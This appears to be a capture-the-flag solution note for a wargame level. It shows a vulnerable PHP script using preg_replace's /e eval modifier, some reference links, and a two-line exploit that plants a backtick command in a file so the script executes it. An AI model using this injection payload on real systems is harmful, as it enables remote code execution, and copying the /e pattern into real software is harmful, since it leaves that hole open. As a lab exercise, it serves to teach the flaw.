# #!/usr/bin/php
# <?php
# function y($m) 
# { 
#     $m = preg_replace("/\./", " x ", $m); 
#     $m = preg_replace("/@/", " y", $m); 
#     return $m; 
# }
# function x($y, $z) 
# { 
#     $a = file_get_contents($y); 
#     $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
#     $a = preg_replace("/\[/", "(", $a); 
#     $a = preg_replace("/\]/", ")", $a); 
#     return $a; 
# }
# $r = x($argv[1], $argv[2]);
# print $r;
# ?>

https://www.google.com/search?q=preg_replace+e+modifier+vulnerability
https://wiki.php.net/rfc/remove_preg_replace_eval_modifier
http://www.madirish.net/402
https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation

echo '[x ${`getflag`}]' > /tmp/x
./level06 /tmp/x